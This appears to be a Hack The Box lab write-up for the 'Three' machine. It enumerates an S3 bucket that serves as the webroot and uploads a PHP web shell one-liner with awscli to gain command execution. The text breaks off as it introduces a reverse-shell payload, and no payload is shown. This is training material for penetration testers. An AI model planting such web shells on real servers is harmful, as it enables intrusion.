# HTB(Three-Linux) 

![](/Assets/HTB/THREE/assets/three.jpg) 

# Summary 

* in this Box will new some steps in *cloud pentesting* and will know about *Amazon S3* and how we can know about its contents and how make our machine contact easily with it. 

# NMAP
![](/Assets/HTB/THREE/assets/nmap.png)

# Ports 
we find port 22 for ssh connection and port 80 for http service will discover it , let's check it by browser . 



![](/Assets/HTB/THREE/assets/web.png)



By checking the web using web browser we find the static page and will check the **subdomains** for this host by using **gobuster** as follow .

**NOTE** : add ip of machine in **/etc/hosts** 

like that  echo **"10.129.10.31 thetoppers.htb" | sudo tee -a /etc/hosts**

![](/Assets/HTB/THREE/assets/gobuster.png)

we found subdomain will be foucs with it **s3.thetoppers.htb** by search on google about it , will find info about **amazon s3 cloud storage**

![](/Assets/HTB/THREE/assets/s3amazon.png)

_**NOTE**_  we should add the subdomain **s3.thetopper.htb** in /etc/hosts like that 


![](/Assets/HTB/THREE/assets/response.png)

The webpage only contains the perivous JSON.

We can interact with this S3 bucket with the aid of the **awscli** utility. It can be installed on Linux using the command **apt install awscli** 

First, we need to configure it using the following command. **aws configure**

![](/Assets/HTB/THREE/assets/ls.png)

We can list all of the S3 buckets hosted by the server by using the ls command.

**aws --endpoint=http://s3.thetoppers.htb s3 ls**

We see the files index.php , .htaccess and a directory called images in the specified bucket. It seems like
this is the webroot of the website running on port 80 . So the Apache server is using this S3 bucket as
storage.

**awscli** has got another feature that allows us to copy files to a remote bucket. We already know that the
website is using PHP. Thus, we can try uploading a PHP shell file to the S3 bucket and since it's uploaded to
the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
will achieve remote code execution.


_We can use the following PHP one-liner which uses the system() function which takes the URL parameter
cmd as an input and executes it as a system command

**<?php system($_GET["cmd"]); ?>**

then make file php 

**echo '<?php system($_GET["cmd"]); ?>' > shell.php**

Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command


**aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb**

![](/Assets/HTB/THREE/assets/result.png)

_We can confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Let us try
executing the OS command id using the URL parameter **cmd**_

![](/Assets/HTB/THREE/assets/id.png)

_The response from the server contains the output of the OS command id , which verified that we have code
execution on the box. Thus, let us now try to obtain a reverse shell.
Through a reverse shell, we will trigger the remote host to connect back to our local machine's IP address on
the specified listening port. We can obtain the tun0 IP address of our local machine using the following
command._


_Let's get a reverse shell by creating a new file shell.sh containing the following bash reverse shell payload
which will connect back to our local machine on port 1337 .






















